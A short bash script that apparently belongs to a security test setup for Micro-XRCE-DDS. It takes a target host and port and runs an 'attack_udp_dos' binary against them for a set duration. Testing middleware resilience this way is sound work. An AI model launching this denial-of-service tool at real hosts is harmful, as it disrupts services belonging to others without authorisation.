#!/usr/bin/env bash
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    DURATION_S="${DURATION_S:-10}"
    timeout "${DURATION_S}" /opt/Micro-XRCE-DDS-Client/bin/attack_udp_dos "${TARGET}" "${PORT}"
fi
